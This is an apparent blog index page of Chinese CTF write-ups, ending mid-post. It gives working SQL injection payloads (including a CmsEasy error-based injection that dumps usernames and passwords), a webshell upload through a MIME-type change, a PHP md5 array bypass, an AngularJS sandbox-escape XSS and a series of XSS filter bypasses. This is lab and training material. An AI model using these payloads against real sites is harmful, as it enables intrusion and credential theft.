<!DOCTYPE html>
<html lang="en">

<!-- Head tag -->
<head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!--Description-->
    

    <!--Author-->
    
        <meta name="author" content="0xEaS">
    

    <!--Open Graph Title-->
    
        <meta property="og:title" content="船到桥头自然直"/>
    

    <!--Open Graph Description-->
    

    <!--Open Graph Site Name-->
    <meta property="og:site_name" content="船到桥头自然直"/>

    <!--Type page-->
    
        <meta property="og:type" content="website" />
    

    <!--Page Cover-->
    

    
        <meta name="twitter:card" content="summary" />
    
    
    

    <!-- Title -->
    
    <title>page - 船到桥头自然直</title>

    <!-- Bootstrap Core CSS -->
    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">

    <!-- Custom Fonts -->
    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->

    <!-- Gallery -->
    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />

    <!-- Custom CSS -->
    
<link rel="stylesheet" href="/css/style.css">


    <!-- Google Analytics -->
    


<meta name="generator" content="Hexo 5.2.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>


<body>

<div class="bg-gradient"></div>
<div class="bg-pattern"></div>

<!-- Menu -->
<!--Menu Links and Overlay-->
<div class="menu-bg">
    <div class="menu-container">
        <ul>
            
            <li class="menu-item">
                <a href="/">
                    Home
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/archives">
                    Archives
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/about.html">
                    About
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/tags">
                    Tags
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/categories">
                    Categories
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/contact.html">
                    Contact
                </a>
            </li>
            
        </ul>
    </div>
</div>

<!--Hamburger Icon-->
<nav>
    <a href="#menu"></a>
</nav>

<div class="container">

    <!-- Main Content -->
    <div class="row">
    <div class="col-sm-12">

        <!--Title and Logo-->
        <header>
    <div class="logo">
        <a href="/"><i class="logo-icon fa fa-cube" aria-hidden="true"></i></a>
        
            <h1 id="main-title" class="title">船到桥头自然直</h1>
        
    </div>
</header>

        <section class="main">
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2021/03/09/SQL%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/">
                SQL绕过姿势
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2021-03-09</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <p><strong>逗号绕过</strong></p>
<p>利用join</p>
<p>select 1,2,3 == select * from (select 1)a join (select 2)b join (select 3)c</p>
<p>题目练习：百度杯9月份sqli（春秋平台）</p>
<p>*<em>select * from ‘admin’ where password=md5($pass,true)*</em></p>
<pre><code>ffifdyop

129581926211651571912466741651878684928</code></pre>
<pre><code>echo md5(&#39;ffifdyop&#39;,true);
//&#39;or&#39;6�]��!r,��b
select * from &#39;admin&#39; where password=md5($pass,true);
//select * from &#39;admin&#39; where password=&#39;&#39;or&#39;6.......&#39;</code></pre>
<p><strong>[GYCTF2020]Blacklist堆叠注入</strong></p>
<p><img src="/images/63.png"></p>
<p>比强网杯过滤更严格。</p>
<p>官方payload：</p>
<pre><code>1&#39;;handler FlagHere open;handler FlagHere read first;handler FlagHere close;#</code></pre>
<p>HANDLER … OPEN语句打开一个表，使其可以使用后续HANDLER … READ语句访问，该表对象未被其他会话共享，并且在会话调用HANDLER … CLOSE或会话终止之前不会关闭</p>
<pre><code>HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST </code></pre>
<p>通过HANDLER tbl_name OPEN打开一张表，无返回结果，实际上我们在这里声明了一个名为tb1_name的句柄。<br>通过HANDLER tbl_name READ FIRST获取句柄的第一行，通过READ NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。<br>通过HANDLER tbl_name CLOSE来关闭打开的句柄。通过索引去查看的话可以按照一定的顺序，获取表中的数据。<br>通过HANDLER tbl_name READ index_name FIRST，获取句柄第一行（索引最小的一行），NEXT获取下一行，PREV获取前一行，LAST获取最后一行（索引最大的一行）</p>
<p><strong>ctfshow_web10虚拟表绕过</strong></p>
<p>源码</p>
<pre><code>&lt;?php
        $flag=&quot;&quot;;
        function replaceSpecialChar($strParam)&#123;
             $regex = &quot;/(select|from|where|join|sleep|and|\s|union|,)/i&quot;;
             return preg_replace($regex,&quot;&quot;,$strParam);
        &#125;
        if (!$con)
        &#123;
            die(&#39;Could not connect: &#39; . mysqli_error());
        &#125;
        if(strlen($username)!=strlen(replaceSpecialChar($username)))&#123;
            die(&quot;sql inject error&quot;);
        &#125;
        if(strlen($password)!=strlen(replaceSpecialChar($password)))&#123;
            die(&quot;sql inject error&quot;);
        &#125;
        $sql=&quot;select * from user where username = &#39;$username&#39;&quot;;
        $result=mysqli_query($con,$sql);
            if(mysqli_num_rows($result)&gt;0)&#123;
                    while($row=mysqli_fetch_assoc($result))&#123;
                        if($password==$row[&#39;password&#39;])&#123;
                            echo &quot;登陆成功&lt;br&gt;&quot;;
                            echo $flag;
                        &#125;

                     &#125;
            &#125;
    ?&gt;</code></pre>
<p>利用虚拟表绕过password检测</p>
<p>使用group by以后会按照password中的值进行排列</p>
<p><img src="/images/84.png"></p>
<p>（group by 后可以跟with rollup，表示在进行分组统计的基础上再次进行汇总统计）</p>
<p><img src="/images/85.png"></p>
<p>结果中将会多出一行，其中password列为null，count（*）为统计和。</p>
<p>因为加入with rollup后 password有一行为NULL，我们只要输入空密码使得（NULL==NULL）即可满足<code>$password==$row[&#39;password&#39;]</code>的限制成功登陆。</p>
<p>payload</p>
<pre><code>username=admin&#39;/**/or/**/1=1/**/group/**/by/**/password/**/with/**/rollup#&amp;password=</code></pre>
<p><strong>ctfshow_web14  information_schema.tables 绕过</strong></p>
<p>反引号：它是为了区分MYSQL的保留字与普通字符而引入的符号</p>
<pre><code>例如information_schema.tables和information_schema.`tables`都可以使用</code></pre>
<p>再利用 load_file(‘path’)读取文件</p>
<p><strong>无列名注入</strong></p>
<p>select x.1 from (select 1,2,3(列名要刚好对应) union select * from flag)x</p>
<p>join绕过</p>
<p>select * from (select * from users as a join users as b)c 爆出第一个字段名</p>
<p>select * from (select * from users as a join users as b using(id,id))c 爆出第二个</p>
<p>select * from (select * from users as a join users as b using(id,username))c 爆第三个</p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2021/03/08/%E7%99%BE%E5%BA%A6%E6%9D%AF9%E6%9C%88%E4%BB%BDYeserCMS/">
                百度杯9月份YeserCMS
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2021-03-08</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <h4 id="先对网站的CMS指纹进行识别"><a href="#先对网站的CMS指纹进行识别" class="headerlink" title="先对网站的CMS指纹进行识别"></a>先对网站的CMS指纹进行识别</h4><p><img src="/images/25.png"></p>
<h4 id="然后百度搜索CmsEasy的历史漏洞。发现存在报错注入漏洞"><a href="#然后百度搜索CmsEasy的历史漏洞。发现存在报错注入漏洞" class="headerlink" title="然后百度搜索CmsEasy的历史漏洞。发现存在报错注入漏洞"></a>然后百度搜索CmsEasy的历史漏洞。发现存在报错注入漏洞</h4><p>url/celive/live/header.php</p>
<p>POSTdata:</p>
<pre><code>xajax=Postdata&amp;xajaxargs[0]=&lt;xjxquery&gt;&lt;q&gt;detail=xxxxxx&#39;,(UpdateXML(1,CONCAT(0x5b,mid((SELECT/**/GROUP_CONCAT(concat(username,&#39;|&#39;,password)) from cmseasy_user),1,32),0x5d),1)),NULL,NULL,NULL,NULL,NULL,NULL)-- &lt;/q&gt;&lt;/xjxquery&gt;</code></pre>
<h4 id="分析注入语句：利用的是updatexml报错注入"><a href="#分析注入语句：利用的是updatexml报错注入" class="headerlink" title="分析注入语句：利用的是updatexml报错注入"></a>分析注入语句：利用的是updatexml报错注入</h4><p>先查表</p>
<pre><code>mid(select /**/group_concat(concat(table_name)) from information_schema.tables where table_schema=database()),1,32)</code></pre>
<p>发现有十几个表，而yesercms_user这张表在最后，不知道大佬怎么遍历的。发现yesercms_user表里有username，password字段。查看数据。</p>
<pre><code>mid(select /**/group_concat(concat(username,0x3a,password)) from yesercms_user,1,32)</code></pre>
<p><img src="/images/26.png"></p>
<p>用户名是admin，密码经过cmd5加密，不够全，修改1，32）范围，看后半段。</p>
<p>解密后得密码为Yeser231</p>
<h4 id="登录后台"><a href="#登录后台" class="headerlink" title="登录后台"></a>登录后台</h4><p>寻找可以上传文件的位置或可以让后台读取文件并回显的位置。（不过真的难找！我是没找到，找到个文件上传的位置发现考点不在那）</p>
<p>在模板编辑那边随便选择一个编辑点击，用burp拦截下包，修改文件名。</p>
<p>POST:</p>
<p>&amp;id=#../../flag.php在response处就可以得到flag了。</p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2021/03/06/i%E6%98%A5%E7%A7%8B-%E7%AC%AC%E4%B8%89%E5%B1%8A%E2%80%9C%E7%99%BE%E8%B6%8A%E6%9D%AF%E2%80%9C%E7%A6%8F%E5%BB%BA%E7%9C%81%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BDo-you-know-upload/">
                i春秋-第三届“百越杯“福建省高校网络空间安全大赛Do you know upload
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2021-03-06</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <p>先上传小马php文件，提示文件类型不对。</p>
<p>用burp截包，修改类型为image/jpeg上传成功。</p>
<p>连接上菜刀，发现没有flag.php。但是往上一层发现有个config.php文件</p>
<p><img src="/images/22.png"></p>
<p><img src="/images/23.png"></p>
<p>发现有数据库连接用户名，密码。</p>
<p>连接上数据库</p>
<p><img src="/images/24.png"></p>
<p>发现有个flag表</p>
<p>select flag from flag 即可获得flag</p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2021/03/06/i%E6%98%A5%E7%A7%8B-%E7%99%BE%E5%BA%A6%E6%9D%AFCTF2017%E4%BA%8C%E6%9C%88%E5%9C%BA%E7%88%86%E7%A0%B4-3/">
                i春秋-百度杯CTF2017二月场爆破-3
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2021-03-06</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <pre class=" language-php"><code class="language-php"><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">require</span><span class="token punctuation">(</span><span class="token string">'./flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'nums'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123; </span>
    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'nums'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> 
    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'time'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'whoami'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'ea'</span><span class="token punctuation">;</span>
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'time'</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">120</span><span class="token operator">&lt;</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123; </span>
    <span class="token function">session_destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>

<span class="token variable">$value</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'value'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$str_rand</span> <span class="token operator">=</span> <span class="token function">range</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'z'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$str_rands</span> <span class="token operator">=</span> <span class="token variable">$str_rand</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$str_rand</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'whoami'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$value</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123; </span>
    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'nums'</span><span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>                                                             
    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'whoami'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$str_rands</span><span class="token punctuation">;</span> 
    <span class="token keyword">echo</span> <span class="token variable">$str_rands</span><span class="token punctuation">;</span>                                                                 
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'nums'</span><span class="token punctuation">]</span><span class="token operator">>=</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123; </span>
   <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
<span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span></code></pre>
<p>代码分析：</p>
<p>初始nums=0；whoami=ea;</p>
<p>当whoami == $value[0].$value[1] 且substr(md5($value),5,4)==0时，nums++,whoami重新生成，会回显出新的whoami。</p>
<p>当nums&gt;=10，回显出flag.</p>
<p>#注：当md5一个数组时，返回null，null==0成立。而前面whoami只需每次修改$value[0]和$value[1]的值即可。</p>
<p>payload：?value[0]=e&amp;value[1]=a;每次修改value[0]和value[1]的值即可。</p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2021/03/05/i%E6%98%A5%E7%A7%8BXSS-Web/">
                i春秋XSS-Web
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2021-03-05</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <h4 id="前面几关比较容易，主要是最后一关，过滤了-lt"><a href="#前面几关比较容易，主要是最后一关，过滤了-lt" class="headerlink" title="前面几关比较容易，主要是最后一关，过滤了&lt;"></a>前面几关比较容易，主要是最后一关，过滤了&lt;</h4><p><img src="/images/21.png"></p>
<p>发现JS框架使用的是 AngularJS 1.4.6版本该版本存在沙箱逃逸。(1.6以下的都存在)。</p>
<h4 id="验证XSS"><a href="#验证XSS" class="headerlink" title="验证XSS"></a>验证XSS</h4><p>payload：36</p>
<p>如果回显出36，则说明成功执行。存在XSS(也可以换其他表达式)</p>
<h4 id="沙箱逃逸"><a href="#沙箱逃逸" class="headerlink" title="沙箱逃逸"></a>沙箱逃逸</h4><pre><code>payload：&#123;&#123;'a'.constructor.prototype.charAt=[].join;$eval('x=1&#125; &#125; &#125;;alert('xss')//');&#125;&#125;</code></pre>
<p>版本（1.4.0-1.4.9)</p>
<p>执行成功后，会触发alert(‘xss’)；可以替换为其他的JS函数。</p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2021/02/28/%E9%BB%91%E5%AE%A2%E4%B8%9B%E6%9E%97%E4%B9%8B%E6%97%85%E5%B0%8F%E6%B8%B8%E6%88%8F/">
                黑客丛林之旅小游戏
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2021-02-28</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <h5 id="0x01"><a href="#0x01" class="headerlink" title="#0x01"></a>#0x01</h5><p><img src="/images/17.png"></p>
<p>所以第一关的密码为go9409。</p>
<h5 id="0x02"><a href="#0x02" class="headerlink" title="#0x02"></a>#0x02</h5><p><img src="/images/18.png"></p>
<p>删掉onsubmit里的验证东西就行。</p>
<h5 id="0x03"><a href="#0x03" class="headerlink" title="#0x03"></a>#0x03</h5><p><img src="/images/19.png"></p>
<p>打开存储查看cookie发现是no，改成yes刷新页面。</p>
<h5 id="0x04"><a href="#0x04" class="headerlink" title="#0x04"></a>#0x04</h5><p>单纯的莫尔斯密码。</p>
<p>最后拼出来是IAMOK</p>
<h5 id="0x05"><a href="#0x05" class="headerlink" title="#0x05"></a>#0x05</h5><p>YmFzZTY0aXNvaw== 明显是base64编码</p>
<p>解密后为base64isok</p>
<h5 id="0x06"><a href="#0x06" class="headerlink" title="#0x06"></a>#0x06</h5><p>Oracle 默认连接端口为1521</p>
<p>MSSQL 默认连接端口为1433</p>
<p>MySQL 默认连接端口为3306</p>
<p>加起来就是答案</p>
<h5 id="0x07"><a href="#0x07" class="headerlink" title="#0x07"></a>#0x07</h5><p>可以还原每一帧写出句子</p>
<p>8b IGNORE wm UPPERCASE qne WORDS</p>
<p>大写翻译为忽略大写</p>
<p>密码为8bwmqne</p>
<h5 id="0x08"><a href="#0x08" class="headerlink" title="#0x08"></a>#0x08</h5><p>社工学题目，靠猜！我没想出来。</p>
<p>在作者游戏首页有介绍到他还有个弟弟叫吴其昌</p>
<p>而游戏网址是fj543，所以密码为fj573。</p>
<h5 id="0x09"><a href="#0x09" class="headerlink" title="#0x09"></a>#0x09</h5><p><img src="/images/20.png"></p>
<p>将访问地址修改为level=9token，User-Agent rv:83 改成MSIE 5.43 就行。</p>
<h5 id="0x0A"><a href="#0x0A" class="headerlink" title="#0x0A"></a>#0x0A</h5><p>下载文件，用压缩包密码爆破工具爆破即可。</p>
<p>但是打开后，里面的txt文件不能查看，所以用type命令读取文件内容即可。</p>
<pre><code>type \\. \D:\。。。\aux.10.txt</code></pre>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2021/01/26/XSS%E9%9D%B6%E5%9C%BA%E5%90%88%E9%9B%86/">
                XSS靶场合集
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2021-01-26</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <h3 id="https：-xss-haozi-me"><a href="#https：-xss-haozi-me" class="headerlink" title="https：//xss.haozi.me"></a>https：//xss.haozi.me</h3><h5 id="0x00"><a href="#0x00" class="headerlink" title="#0x00"></a>#0x00</h5><pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">render</span> <span class="token punctuation">(</span>input<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
  <span class="token keyword">return</span> <span class="token markup">&lt;div + input + /div></span>
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span></code></pre>
<p>代码分析：无任何过滤。</p>
<pre><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
<h5 id="0x01"><a href="#0x01" class="headerlink" title="#0x01"></a>#0x01</h5><pre class=" language-PHP"><code class="language-PHP">function render (input) &#123;
  return <textarea + input + /textarea>
&#125;</code></pre>
<p>代码分析：内容生效在标签内，会无效。拼接绕过</p>
<pre class=" language-PHP"><code class="language-PHP"></textarea><script>alert(1)</script></code></pre>
<h5 id="0x02"><a href="#0x02" class="headerlink" title="#0x02"></a>#0x02</h5><pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">render</span> <span class="token punctuation">(</span>input<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
  <span class="token keyword">return</span> <span class="token string">'&lt;input type="name" value="'</span> <span class="token operator">+</span> input <span class="token operator">+</span> <span class="token string">'">'</span>
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span></code></pre>
<p>代码分析：同上关相同，拼接绕过。</p>
<pre><code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
<h5 id="0x03"><a href="#0x03" class="headerlink" title="#0x03"></a>#0x03</h5><pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">render</span> <span class="token punctuation">(</span>input<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
  <span class="token keyword">const</span> stripBracketsRe <span class="token operator">=</span> <span class="token operator">/</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">/</span>g
  input <span class="token operator">=</span> input<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>stripBracketsRe<span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
  <span class="token keyword">return</span> input
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span></code></pre>
<p>代码分析：过滤了（），可以利用反引号绕过</p>
<pre><code>&lt;script&gt;alert`1`&lt;/script&gt;</code></pre>
<h5 id="0x04"><a href="#0x04" class="headerlink" title="#0x04"></a>#0x04</h5><pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">render</span> <span class="token punctuation">(</span>input<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
  <span class="token keyword">const</span> stripBracketsRe <span class="token operator">=</span> <span class="token operator">/</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">)</span>`<span class="token punctuation">]</span><span class="token operator">/</span>g
  input <span class="token operator">=</span> input<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>stripBracketsRe<span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
  <span class="token keyword">return</span> input
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span></code></pre>
<p>代码分析：过滤了（）和`。利用HTML实体编码绕过。</p>
<pre><code>&lt;img src=# onerror=alert&amp;#40;1&amp;#41;&gt;    
&lt;svg onload=&quot;alert&amp;#40;1&amp;#41;&quot;         
&lt;svg&gt;&lt;script&gt;alert&amp;#40;1&amp;#41;&lt;/script&gt;</code></pre>
<p>上面是3种方法，实体编码只在html里会生效，在JS无效。&lt;svg 会解析这个实体编码。</p>
<h5 id="0x05"><a href="#0x05" class="headerlink" title="#0x05"></a>#0x05</h5><pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">render</span> <span class="token punctuation">(</span>input<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
  input <span class="token operator">=</span> input<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">/</span>g<span class="token punctuation">,</span> <span class="token string">'😂'</span><span class="token punctuation">)</span>
  <span class="token keyword">return</span> <span class="token string">'&lt;!-- '</span> <span class="token operator">+</span> input <span class="token operator">+</span> <span class="token string">' -->'</span>
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span></code></pre>
<p>代码分析：过滤了–&gt;,在HTML有两种注释方法–&gt;和–!&gt;。</p>
<pre><code>--!&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
<h5 id="0x06"><a href="#0x06" class="headerlink" title="#0x06"></a>#0x06</h5><pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">render</span> <span class="token punctuation">(</span>input<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
  input <span class="token operator">=</span> input<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span>auto<span class="token operator">|</span>on<span class="token punctuation">.</span><span class="token operator">*</span><span class="token operator">=</span><span class="token operator">|</span><span class="token operator">></span><span class="token operator">/</span>ig<span class="token punctuation">,</span> <span class="token string">'_'</span><span class="token punctuation">)</span>
  <span class="token keyword">return</span> `<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span>1</span> <span class="token attr-name">$&amp;#123;input&amp;#125;</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>`
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span></code></pre>
<p>代码分析：过滤了以auto或on开头以=结尾，和&gt;。可以通过换行绕过。</p>
<pre><code>type=&quot;image&quot; src=# onerror
=alert(1)</code></pre>
<h5 id="0x07"><a href="#0x07" class="headerlink" title="#0x07"></a>#0x07</h5><pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">render</span> <span class="token punctuation">(</span>input<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
  <span class="token keyword">const</span> stripTagsRe <span class="token operator">=</span> <span class="token operator">/</span><span class="token markup">&lt;\/?[^></span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">></span><span class="token operator">/</span>gi

  input <span class="token operator">=</span> input<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>stripTagsRe<span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
  <span class="token keyword">return</span> `<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>article</span><span class="token punctuation">></span></span></span>$<span class="token operator">&amp;</span><span class="token shell-comment comment">#123;input&amp;#125;</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>article</span><span class="token punctuation">></span></span></span>`
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span></code></pre>
<p>代码分析：过滤了&lt;…&gt;和&lt;/…&gt;</p>
<pre><code>&lt;img src=&quot;#&quot; onerror=&quot;alert(1)&quot;
&lt;svg onload=&quot;alert(1)&quot;</code></pre>
<p>这是两种方法</p>
<h5 id="0x08"><a href="#0x08" class="headerlink" title="#0x08"></a>#0x08</h5><pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">render</span> <span class="token punctuation">(</span>src<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
  src <span class="token operator">=</span> src<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span><span class="token markup">&lt;\/style></span><span class="token operator">/</span>ig<span class="token punctuation">,</span> <span class="token string">'/* \u574F\u4EBA */'</span><span class="token punctuation">)</span>
  <span class="token keyword">return</span> `
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span></span>
      $<span class="token operator">&amp;</span><span class="token shell-comment comment">#123;src&amp;#125;</span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span></span>
  `
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span></code></pre>
<p>代码分析：过滤了&lt;/style》,可以利用空格和换行绕过</p>
<pre><code>&lt;/style &gt;&lt;script&gt;alert(1)&lt;/script&gt;

&lt;/style
